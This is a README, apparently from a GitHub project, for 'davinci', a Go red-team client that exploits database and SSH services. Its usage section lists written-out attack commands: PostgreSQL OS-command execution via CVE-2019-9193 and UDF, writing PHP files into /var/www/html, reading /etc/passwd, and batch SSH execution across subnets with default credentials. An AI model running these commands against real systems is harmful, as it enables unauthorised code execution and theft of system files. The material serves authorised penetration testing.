# davinci

## 免责声明

本程序应仅用于授权的安全测试与研究目的。
由于传播、利用本工具而造成的任何直接或者间接的后果及损失，均由使用者负责，工具作者不为此承担任何责任。

## 介绍

davinci是一个多组件客户端命令行工具，利用golang的特性，可轻易编译出在各类操作系统和架构下的可执行文件，在各种环境下使用。

目前内置了下列组件的常见利用方式，包括信息收集、非交互式执行、交互式执行等：
- MySQL
- PostgreSQL
- Clickhouse
- GaussDB
- MongoDB
- Redis
- SSH
- Elasticsearch



## 编译方式

```
go env -w GOOS=$os
go env -w GOARCH=$arch
go build -ldflags "-w -s" -o bin/$name davinci.go
```

对于常见的平台已提供powershell脚本执行编译使用：
```
.\win_amd64.ps1
.\linux_amd64.ps1
```

你也可以直接使用release中编译好的可执行文件。



## 使用方式

```bash
# ./davinci --help
multi-component client,include  database, middleware, queue, etc.
used for red team simulation scenarios

Usage:
  davinci [command]

Available Commands:
  batch       batch execute
  clickhouse  clickhouse client
  completion  Generate the autocompletion script for the specified shell
  es          elasticsearch client
  gaussdb     gaussdb client
  help        Help about any command
  mongo       mongo client
  mysql       mysql client
  pgsql       pgsql client
  redis       redis client
  ssh         ssh client

Flags:
  -h, --help     help for davinci
      --no-log   not log output to file
      --silent   close info level output

Use "davinci [command] --help" for more information about a command.
```

每个组件均作为一个子命令来使用，几乎每个组件都至少会提供三种使用方式：
- exec : 非交互式执行单条命令
- shell : 进入交互式命令执行
- auto_gather: 自动化信息收集，实际上就是批量执行一组命令

注意：上述的"命令"是指组件自身的命令，例如对于MySQL来说是SQL，而对于SSH来说则是系统命令。

针对不同组件会提供特定的使用方式，包括但不限于：系统命令执行、文件读写等
```bash
Example:
  davinci pgsql exec        -H 192.168.1.2 -P 5432 -u postgres -p 123456 -c "select user;"
  davinci pgsql shell       -H 192.168.1.2 -P 5432 -u postgres -p 123456
  davinci pgsql auto_gather -H 192.168.1.2 -P 5432 -u postgres -p 123456
  davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --cve-2019-9193
  davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --cve-2019-9193 --no-interactive -c "whoami"
  davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --udf
  davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --udf --no-interactive -c "whoami"
  davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --ssl_passpharse -c "whoami"
  davinci pgsql writefile   -H 192.168.1.2 -P 5432 -u postgres -p 123456 --lo_export -s ./eval.php -t /var/www/html/1.php
  davinci pgsql writefile   -H 192.168.1.2 -P 5432 -u postgres -p 123456 --copy_to -C "<?php phpinfo(); ?>" -t /var/www/html/1.php
  davinci pgsql readfile    -H 192.168.1.2 -P 5432 -u postgres -p 123456 --lo_import -t /etc/passwd
  davinci pgsql readfile    -H 192.168.1.2 -P 5432 -u postgres -p 123456 --pg_read -t /etc/passwd
  davinci pgsql readfile    -H 192.168.1.2 -P 5432 -u postgres -p 123456 --copy_from -t /etc/passwd --hex
  davinci pgsql mkdir       -H 192.168.1.2 -P 5432 -u postgres -p 123456 -t /etc/pg_dir
  davinci pgsql lsdir       -H 192.168.1.2 -P 5432 -u postgres -p 123456 -t /
```

各个组件的详细使用方式以及支持的功能，请参考：[wiki](https://github.com/Ape1ron/davinci/wiki)

此外，工具还提供了一个批量执行的功能
```bash
# ./davinci batch --help
batch execute:
  - export:      export execute config template
  - exec  :      batch execute

Usage:
  davinci batch [export|exec] [flags]

Flags:
  -b, --b64config string   the config base64 encode
  -f, --file string        config file (default ".davinci_batch.json")
  -h, --help               help for batch

Global Flags:
      --no-log   not log output to file
      --silent   close info level output
```
你可以通过`./davinci batch export`先导出一个模板，然后基于模板来制定批量执行的计划：
```bash
[
    {
        "cmd_type": "ssh",
        "hosts": [
            "127.0.0.1",
            "192.168.83.1/24",
            "192.168.83.1-20"
        ],
        "port": 22,
        "user": "root",
        "passwd": "123456",
        "cmds": [
            "ls -al /",
            "ifconfig"
        ]
    },
    {
        "cmd_type": "redis",
        "hosts": [
            "127.0.0.1"
        ],
        "port": 6379,
        "cmds": [
            "dbsize"
        ]
    }
] 
```
目前执行批量执行的组件包括：ssh、mysql、pgsql、gaussdb、clickhouse、redis、mongo
```bash
./davinci batch exec -f .davinci_batch-1.json
```



## 输出记录

默认情况下，会将所有输出记录到日志文件: `davinci_{y}-{m}-{d}.log`（除了交互式的ssh）

要关闭日志记录只需要使用`--no-log`选项即可。

此外，默认输出级别是info级别，会包含执行过程的详细信息，可以使用`--silent`选项来关闭详细输出，仅输出Warn级别以上的信息。



## todo

- oracle
- sqlserver
- etcd